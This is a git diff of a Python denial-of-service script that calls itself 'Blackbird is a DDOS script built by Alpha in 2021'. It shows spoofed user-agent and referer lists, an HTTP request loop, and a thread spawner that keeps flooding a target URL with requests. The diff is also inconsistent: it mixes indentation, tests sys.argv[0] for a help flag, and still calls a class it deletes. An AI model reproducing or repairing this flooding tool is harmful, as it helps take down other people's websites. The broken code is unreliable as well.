@@ -12,7 +12,6 @@ user_agent=[]
 headers={}
 req_num_count=0
 
-
 def user_agent_append():
   user_agent.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
   user_agent.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
@@ -2941,6 +2940,12 @@ def reffers_append():
 	headers_referers.append('http://engadget.search.aol.com/search?q=')
 reffers_append()
 
+def usage():
+	print('Blackbird is a DDOS script built by Alpha in 2021')
+	print('_____________________________________________________________')
+	
+if sys.argv[0]=='-h':
+	usage()
 
 def trang():
   while True:
@@ -2950,17 +2955,16 @@ def trang():
   headers['User-Agent']=userAgentCHoose
   req=urllib.request.Request(url, headers=headers)
   thrill=urllib.request.urlopen(req)
+	
+def trang_send():
+	for i in range(threading_usages):
+		get_attack=threading.Thread(target=request_attack)
+	    	get_attack.start()
 
-class sending_attk:
-	def trang_send():
-	  for i in range(threading_usages):
-	    get_attack=threading.Thread(target=request_attack)
-	    get_attack.start()
-
-	  while True:
-	    if threading.active_count() < threading_usages:
-	      get_attack=threading.Thread(target=request_attack)
-	      get_attack.start()
+	while True:
+		if threading.active_count() < threading_usages:
+	      		get_attack=threading.Thread(target=request_attack)
+	      		get_attack.start()
 
 if __name__=="__main__":
 	sending_attk
